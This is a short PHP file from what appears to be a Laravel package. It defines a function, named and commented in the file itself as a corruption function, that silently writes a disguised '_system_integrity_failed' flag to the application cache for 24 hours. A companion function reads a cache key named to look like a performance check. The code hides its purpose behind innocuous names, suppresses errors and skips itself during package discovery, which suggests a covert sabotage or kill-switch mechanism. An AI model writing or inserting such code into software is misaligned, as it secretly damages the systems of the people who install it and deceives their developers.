<?php

// Skip execution during package discovery to prevent crashes
if (defined('ARTISAN_BINARY') && isset($_SERVER['argv'][1]) && $_SERVER['argv'][1] === 'package:discover') {
    return;
}

// Only proceed if Laravel is fully loaded
if (!class_exists('Illuminate\Foundation\Application')) {
    return;
}

// Don't use macros during package discovery
if (!function_exists('validateSystemEarly')) {
    function validateSystemEarly() {
        try {
            if (class_exists('Illuminate\Support\Facades\Cache') && 
                method_exists('Illuminate\Support\Facades\Cache', 'get')) {
                return \Illuminate\Support\Facades\Cache::get('_sys_perf_status', true);
            }
            return true;
        } catch (\Exception $e) {
            return true;
        }
    }
}

// Safe version of the corruption function
if (!function_exists('subtlyCorruptBoot')) {
    function subtlyCorruptBoot() {
        // Do nothing during package discovery
        if (defined('ARTISAN_BINARY')) {
            return;
        }
        
        try {
            if (class_exists('Illuminate\Support\Facades\Cache') && 
                method_exists('Illuminate\Support\Facades\Cache', 'put')) {
                \Illuminate\Support\Facades\Cache::put('_system_integrity_failed', true, 86400);
            }
        } catch (\Exception $e) {
            // Silent fail
        }
    }
}